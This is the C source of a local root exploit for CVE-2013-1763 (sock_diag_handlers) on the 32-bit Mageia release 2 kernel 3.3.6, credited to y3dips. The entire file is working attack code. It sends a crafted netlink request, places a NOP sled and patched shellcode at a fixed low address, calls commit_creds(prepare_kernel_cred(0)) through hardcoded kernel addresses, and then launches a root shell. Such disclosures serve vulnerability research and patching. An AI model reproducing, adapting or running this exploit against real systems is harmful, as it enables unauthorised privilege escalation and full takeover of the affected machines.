/* Exploit Title: Mageia release 2 (32bit) sock_diag_handlers Local root exploit
 Date: 22-03-2013
 Exploit Author: y3dips@echo.or.id | @y3dips
 Vendor Homepage: http://www.mageia.org/en/
 Software Link: http://www.mageia.org/en/downloads/
 Version: Mageia release 2 Kernel 3.3.6-desktop586-2.mga2 i686
 Tested on: Mageia release 2 Kernel 3.3.6-desktop586-2.mga2 i686
 CVE : 2013-1763 */

#include <unistd.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <netinet/tcp.h>
#include <errno.h>
#include <linux/if.h>
#include <linux/filter.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <linux/sock_diag.h>
#include <linux/inet_diag.h>
#include <linux/unix_diag.h>
#include <sys/mman.h>
 
typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;
unsigned long sock_diag_handlers, nl_table;
 
int __attribute__((regparm(3)))
kcode()
{
    commit_creds(prepare_kernel_cred(0));
    return -1;
} 

char loncat[] = "\x55\x89\xe5\xb8\x3c\x87\x04\x08\xff\xd0\x5d\xc3\x55\x89\xe5\x81\xec\x58\x02"; 
                /*asm("mov $kcode, %eax; call  %eax");*/
  
int trigger() {
    int socks;
    unsigned long mmap_start = 0x10000;
    unsigned long mmap_size= 0x120000;
    void *payload;
    struct { 
  struct nlmsghdr nlh;
        struct unix_diag_req r;
    } req;
 
    socks = socket(PF_NETLINK, SOCK_RAW, NETLINK_SOCK_DIAG);
    if (socks < 0)
        { printf("[+] Can't create sock diag socket...\n");
        return -1; }
 
    memset(&req, 0, sizeof(req));
    req.nlh.nlmsg_len = sizeof(req);
    req.nlh.nlmsg_type = SOCK_DIAG_BY_FAMILY;
    req.nlh.nlmsg_flags = NLM_F_REQUEST;
    req.r.sdiag_family = 185; /*nl_table-sock_diag_handlers/4*/
 
    payload=mmap((void*)mmap_start, mmap_size, PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0);
    if ((long)payload == -1) 
        { printf("[+] Failed to mmap() at target.\n");
        return -1; }
    
    *(unsigned long *)&loncat[4] =(unsigned long)kcode;
    memset((void *)mmap_start, 0x90, mmap_size);
    memcpy((void *)mmap_start+mmap_size-sizeof(loncat), loncat, sizeof(loncat));
 
    send(socks, &req, sizeof(req), 0);
}

int main()
{
  printf("[+] Mageia release 2 (32bit) sock_diag_handlers Local root exploit\n");
  /* Mageia release 2 Kernel 3.3.6-desktop586-2.mga2 i686*/  
  commit_creds = (_commit_creds) 0xc0159cd0;
      prepare_kernel_cred = (_prepare_kernel_cred) 0xc0159ed0;
        printf("[+] Triggering payload and Exploiting Sockz...\n");
        trigger();
  if(getuid()) {
    printf("[+] Exploit Failed...\n");
    return -1;
  }
  printf("[+] Got root!...\n");
        execl("/bin/sh", "/bin/sh", NULL);  
}